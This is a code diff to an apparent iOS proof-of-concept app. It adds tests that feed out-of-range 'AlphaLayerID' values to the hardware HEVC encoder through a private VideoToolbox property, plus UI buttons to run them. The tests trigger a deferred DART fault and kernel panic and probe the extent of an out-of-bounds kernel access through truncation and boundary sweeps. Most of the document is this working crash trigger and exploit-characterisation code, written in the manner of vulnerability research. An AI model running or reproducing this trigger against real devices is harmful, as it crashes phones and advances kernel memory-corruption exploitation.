@@ -2150,6 +2150,287 @@ static void runNarrowPanic(void) {
 }
 
 // ============================================================
+// Phase 2: Deferred DART Fault Tests (120-second idle-wait protocol)
+// ============================================================
+
+static volatile BOOL g_phase2Running = NO;
+static int g_truncIdx = 0;
+
+static BOOL phase2Encode(int alphaID, NSString *label) {
+    NSDictionary *spec = @{
+        (NSString *)kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder: @YES,
+        (NSString *)kVTVideoEncoderSpecification_RequireHardwareAcceleratedVideoEncoder: @YES,
+    };
+
+    VTCompressionSessionRef session = NULL;
+    OSStatus status = VTCompressionSessionCreate(
+        kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
+        (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
+        narrowCallback, NULL, &session);
+
+    if (status != noErr) {
+        FAIL(@"[%@] Session creation failed: %d", label, (int)status);
+        return NO;
+    }
+
+    status = VTSessionSetProperty(session,
+        CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
+        (__bridge CFTypeRef)@(alphaID));
+    INFO(@"[%@] SET AlphaLayerID=%d: %s", label, alphaID,
+        status == noErr ? "OK" : "REJECTED");
+
+    CVPixelBufferRef pb = createTestPixelBuffer(320, 240);
+    if (!pb) {
+        FAIL(@"[%@] Pixel buffer failed", label);
+        VTCompressionSessionInvalidate(session);
+        CFRelease(session);
+        return NO;
+    }
+
+    g_narrowGotOutput = NO;
+    g_oracleContext = label;
+
+    status = VTCompressionSessionPrepareToEncodeFrames(session);
+    if (status != noErr) {
+        FAIL(@"[%@] PrepareToEncode failed: %d", label, (int)status);
+        CVPixelBufferRelease(pb);
+        VTCompressionSessionInvalidate(session);
+        CFRelease(session);
+        return NO;
+    }
+
+    LOG(@"[%@] *** ENCODING WITH AlphaLayerID=%d ***", label, alphaID);
+    status = VTCompressionSessionEncodeFrame(session, pb,
+        CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
+    INFO(@"[%@] EncodeFrame: %d (%s)", label, (int)status,
+        status == noErr ? "submitted" : "error");
+
+    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
+    [NSThread sleepForTimeInterval:2.0];
+
+    BOOL ok = g_narrowGotOutput;
+    INFO(@"[%@] Callback output: %@", label, ok ? @"YES" : @"NO (encode error)");
+
+    CVPixelBufferRelease(pb);
+    VTCompressionSessionInvalidate(session);
+    CFRelease(session);
+
+    return ok;
+}
+
+static void idleWait(int seconds, NSString *reason) {
+    INFO(@"=== IDLE WAIT: %ds (%@) ===", seconds, reason);
+    INFO(@"Deferred DART fault fires during this wait if triggered.");
+    INFO(@"If phone reboots during countdown, the previous encode was the trigger.");
+    pocLog(@"");
+    for (int i = seconds; i > 0; i--) {
+        if (i % 10 == 0 || i <= 5) {
+            INFO(@"... %ds remaining (no panic so far)", i);
+        }
+        [NSThread sleepForTimeInterval:1.0];
+    }
+    PASS(@"=== IDLE WAIT COMPLETE: no DART fault in %ds ===", seconds);
+    pocLog(@"");
+}
+
+static void runPhase2_IdleWait(void) {
+    if (g_phase2Running) {
+        INFO(@"Phase 2 test already running — wait for it.");
+        return;
+    }
+    g_phase2Running = YES;
+
+    pocLog(@"");
+    pocLog(@"╔══════════════════════════════════════════╗");
+    pocLog(@"║  PHASE 2A: Alpha=255 + 120s Idle Wait   ║");
+    pocLog(@"║  Catches DEFERRED DART faults            ║");
+    pocLog(@"║  *** CAN CAUSE KERNEL PANIC ***          ║");
+    pocLog(@"╚══════════════════════════════════════════╝");
+    pocLog(@"");
+
+    // Canary
+    LOG(@"--- CANARY: AlphaLayerID=0 ---");
+    BOOL canary = phase2Encode(0, @"CANARY");
+    if (!canary) {
+        FAIL(@"CANARY FAILED — AVE2 wedged. Reboot phone.");
+        g_phase2Running = NO;
+        return;
+    }
+    PASS(@"CANARY OK — encoder healthy.");
+    idleWait(15, @"canary cooldown");
+
+    // The trigger
+    LOG(@"--- TRIGGER: AlphaLayerID=255 ---");
+    INFO(@"Known deferred DART trigger. Encode will error (-17691).");
+    INFO(@"The DART fault fires AFTER the callback — during idle wait.");
+    pocLog(@"");
+
+    BOOL gotOutput = phase2Encode(255, @"Alpha255-idle");
+
+    if (gotOutput) {
+        PASS(@"Got output! (unexpected — usually errors with -17691)");
+    } else {
+        INFO(@"Encode errored as expected. DMA descriptor may be armed.");
+    }
+    pocLog(@"");
+
+    LOG(@"*** 120-SECOND IDLE WAIT BEGINS NOW ***");
+    LOG(@"DO NOT TOUCH THE PHONE. DO NOT PRESS ANY BUTTON.");
+    LOG(@"If panic fires during this wait = CONFIRMED deferred DART.");
+    pocLog(@"");
+
+    idleWait(120, @"deferred DART window for Alpha=255");
+
+    PASS(@"=== SURVIVED 120s — no deferred fault this run ===");
+    INFO(@"Note: the DART fault is probabilistic (race condition).");
+    INFO(@"Run this test 5x total to establish reliability.");
+    INFO(@"Collect .ips logs after any reboot during the wait.");
+    pocLog(@"");
+
+    g_phase2Running = NO;
+}
+
+static void runPhase2_Truncation(void) {
+    if (g_phase2Running) {
+        INFO(@"Phase 2 test already running — wait for it.");
+        return;
+    }
+    g_phase2Running = YES;
+
+    int truncValues[] = {63, 127, 191};
+    int numValues = 3;
+    int idx = g_truncIdx % numValues;
+    g_truncIdx++;
+
+    int val = truncValues[idx];
+    int mod64 = val & 0x3F;
+
+    pocLog(@"");
+    pocLog(@"╔══════════════════════════════════════════╗");
+    pocLog(@"║  PHASE 2B: Truncation Test               ║");
+    pocLog(@"║  Determines: kernel uses raw or 6-bit?   ║");
+    pocLog(@"║  *** CAN CAUSE KERNEL PANIC ***          ║");
+    pocLog(@"╚══════════════════════════════════════════╝");
+    pocLog(@"");
+    LOG(@"Test %d/%d: AlphaLayerID=%d (mod-64 = %d)", idx + 1, numValues, val, mod64);
+    pocLog(@"");
+    INFO(@"All three values (63, 127, 191) reduce to 63 in the");
+    INFO(@"6-bit VPS bitstream field. Results tell us:");
+    INFO(@"  ALL panic  -> kernel uses raw IOKit value -> wide OOB");
+    INFO(@"  Only 63    -> kernel uses 6-bit truncation -> 1-element OOB");
+    INFO(@"  None panic -> trigger requires -17691 error path (255-specific)");
+    pocLog(@"");
+
+    // Canary
+    LOG(@"--- CANARY: AlphaLayerID=0 ---");
+    BOOL canary = phase2Encode(0, @"CANARY");
+    if (!canary) {
+        FAIL(@"CANARY FAILED — AVE2 wedged. Reboot phone.");
+        g_phase2Running = NO;
+        return;
+    }
+    PASS(@"CANARY OK.");
+    idleWait(10, @"canary cooldown");
+
+    // Trigger
+    NSString *label = [NSString stringWithFormat:@"Trunc-%d", val];
+    LOG(@"--- TRIGGER: AlphaLayerID=%d (6-bit: %d) ---", val, mod64);
+    INFO(@"If phone reboots after this line, Alpha=%d is a trigger.", val);
+    pocLog(@"");
+
+    BOOL gotOutput = phase2Encode(val, label);
+
+    if (gotOutput) {
+        PASS(@"[%@] Got encoded output.", label);
+    } else {
+        INFO(@"[%@] Encode error — DMA descriptor may be armed.", label);
+    }
+    pocLog(@"");
+
+    LOG(@"*** 120-SECOND IDLE WAIT ***");
+    idleWait(120, [NSString stringWithFormat:@"deferred DART window for Alpha=%d", val]);
+
+    PASS(@"=== Alpha=%d SURVIVED 120s ===", val);
+    pocLog(@"");
+
+    int nextIdx = g_truncIdx % numValues;
+    INFO(@"Next press: AlphaLayerID=%d (reboot first if panic occurred!)", truncValues[nextIdx]);
+    INFO(@"After all 3: compare which panicked to determine kernel behavior.");
+    pocLog(@"");
+
+    g_phase2Running = NO;
+}
+
+static void runPhase2_Boundary(void) {
+    if (g_phase2Running) {
+        INFO(@"Phase 2 test already running — wait for it.");
+        return;
+    }
+    g_phase2Running = YES;
+
+    // Known: 255 panics (deferred), 32/64 don't panic in 3s tests
+    // Binary search: test mid-points with 120s waits
+    // User runs this repeatedly; it cycles through the boundary values
+    static int boundaryValues[] = {128, 192, 160, 144, 136, 224, 240, 248};
+    static int g_boundIdx = 0;
+    int idx = g_boundIdx % 8;
+    g_boundIdx++;
+
+    int val = boundaryValues[idx];
+
+    pocLog(@"");
+    pocLog(@"╔══════════════════════════════════════════╗");
+    pocLog(@"║  PHASE 2C: Boundary Sweep                ║");
+    pocLog(@"║  Finding minimum panicking Alpha value    ║");
+    pocLog(@"║  *** CAN CAUSE KERNEL PANIC ***          ║");
+    pocLog(@"╚══════════════════════════════════════════╝");
+    pocLog(@"");
+    LOG(@"Boundary test %d/8: AlphaLayerID=%d", idx + 1, val);
+    INFO(@"Known: 255 panics (deferred DART), <=64 survives.");
+    INFO(@"Testing middle values to find the boundary.");
+    pocLog(@"");
+
+    // Canary
+    LOG(@"--- CANARY: AlphaLayerID=0 ---");
+    BOOL canary = phase2Encode(0, @"CANARY");
+    if (!canary) {
+        FAIL(@"CANARY FAILED — AVE2 wedged. Reboot phone.");
+        g_phase2Running = NO;
+        return;
+    }
+    PASS(@"CANARY OK.");
+    idleWait(10, @"canary cooldown");
+
+    // Trigger
+    NSString *label = [NSString stringWithFormat:@"Boundary-%d", val];
+    LOG(@"--- TEST: AlphaLayerID=%d ---", val);
+    INFO(@"If phone reboots, %d is above the boundary.", val);
+    pocLog(@"");
+
+    BOOL gotOutput = phase2Encode(val, label);
+
+    if (gotOutput) {
+        PASS(@"[%@] Encode succeeded — got output.", label);
+    } else {
+        INFO(@"[%@] Encode error — watching for deferred fault.", label);
+    }
+    pocLog(@"");
+
+    LOG(@"*** 120-SECOND IDLE WAIT ***");
+    idleWait(120, [NSString stringWithFormat:@"boundary test Alpha=%d", val]);
+
+    PASS(@"=== Alpha=%d SURVIVED 120s ===", val);
+    pocLog(@"");
+
+    int nextIdx = g_boundIdx % 8;
+    INFO(@"Next press: AlphaLayerID=%d", boundaryValues[nextIdx]);
+    INFO(@"Record which values panic and which survive to find boundary.");
+    pocLog(@"");
+
+    g_phase2Running = NO;
+}
+
+// ============================================================
 // Tier 1b: OOB trigger — ONLY for properties verified by oracle
 // ============================================================
 
@@ -2588,7 +2869,47 @@ static void runTier2Probe(void) {
     [self.bothBtn addTarget:self action:@selector(runBoth) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.bothBtn];
 
-    CGFloat logTop = row4 + btnH + gap;
+    // Phase 2 buttons — row 5: idle-wait, truncation, boundary
+    CGFloat row5 = row4 + btnH + gap;
+    CGFloat p2BtnW = (w - pad * 2 - gap * 2) / 3;
+
+    UIButton *idleBtn = [UIButton buttonWithType:UIButtonTypeSystem];
+    idleBtn.frame = CGRectMake(pad, row5, p2BtnW, btnH);
+    idleBtn.backgroundColor = [UIColor colorWithRed:0.4 green:0.0 blue:0.0 alpha:1];
+    idleBtn.layer.cornerRadius = 8;
+    idleBtn.layer.borderWidth = 2;
+    idleBtn.layer.borderColor = [UIColor colorWithRed:1.0 green:0.3 blue:0.0 alpha:1].CGColor;
+    idleBtn.titleLabel.font = [UIFont boldSystemFontOfSize:12];
+    [idleBtn setTitle:@"Idle Wait" forState:UIControlStateNormal];
+    [idleBtn setTitleColor:[UIColor colorWithRed:1.0 green:0.3 blue:0.0 alpha:1] forState:UIControlStateNormal];
+    [idleBtn addTarget:self action:@selector(runIdleWait) forControlEvents:UIControlEventTouchUpInside];
+    [self.view addSubview:idleBtn];
+
+    UIButton *truncBtn = [UIButton buttonWithType:UIButtonTypeSystem];
+    truncBtn.frame = CGRectMake(pad + p2BtnW + gap, row5, p2BtnW, btnH);
+    truncBtn.backgroundColor = [UIColor colorWithRed:0.35 green:0.0 blue:0.15 alpha:1];
+    truncBtn.layer.cornerRadius = 8;
+    truncBtn.layer.borderWidth = 2;
+    truncBtn.layer.borderColor = [UIColor colorWithRed:1.0 green:0.0 blue:0.5 alpha:1].CGColor;
+    truncBtn.titleLabel.font = [UIFont boldSystemFontOfSize:12];
+    [truncBtn setTitle:@"Truncation" forState:UIControlStateNormal];
+    [truncBtn setTitleColor:[UIColor colorWithRed:1.0 green:0.0 blue:0.5 alpha:1] forState:UIControlStateNormal];
+    [truncBtn addTarget:self action:@selector(runTruncation) forControlEvents:UIControlEventTouchUpInside];
+    [self.view addSubview:truncBtn];
+
+    UIButton *boundBtn = [UIButton buttonWithType:UIButtonTypeSystem];
+    boundBtn.frame = CGRectMake(pad + (p2BtnW + gap) * 2, row5, p2BtnW, btnH);
+    boundBtn.backgroundColor = [UIColor colorWithRed:0.3 green:0.0 blue:0.3 alpha:1];
+    boundBtn.layer.cornerRadius = 8;
+    boundBtn.layer.borderWidth = 2;
+    boundBtn.layer.borderColor = [UIColor colorWithRed:0.8 green:0.0 blue:1.0 alpha:1].CGColor;
+    boundBtn.titleLabel.font = [UIFont boldSystemFontOfSize:12];
+    [boundBtn setTitle:@"Boundary" forState:UIControlStateNormal];
+    [boundBtn setTitleColor:[UIColor colorWithRed:0.8 green:0.0 blue:1.0 alpha:1] forState:UIControlStateNormal];
+    [boundBtn addTarget:self action:@selector(runBoundary) forControlEvents:UIControlEventTouchUpInside];
+    [self.view addSubview:boundBtn];
+
+    CGFloat logTop = row5 + btnH + gap;
     self.logView = [[UITextView alloc] initWithFrame:
         CGRectMake(0, logTop, w, self.view.bounds.size.height - logTop)];
     self.logView.autoresizingMask = UIViewAutoresizingFlexibleWidth | UIViewAutoresizingFlexibleHeight;
@@ -2670,6 +2991,24 @@ static void runTier2Probe(void) {
         pocLog(@"  Copy logs: long-press → Select All → Copy");
         pocLog(@"  Or check Console.app on Mac");
         pocLog(@"════════════════════════════════════");
+    });
+}
+
+- (void)runIdleWait {
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        runPhase2_IdleWait();
+    });
+}
+
+- (void)runTruncation {
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        runPhase2_Truncation();
+    });
+}
+
+- (void)runBoundary {
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        runPhase2_Boundary();
     });
 }
 
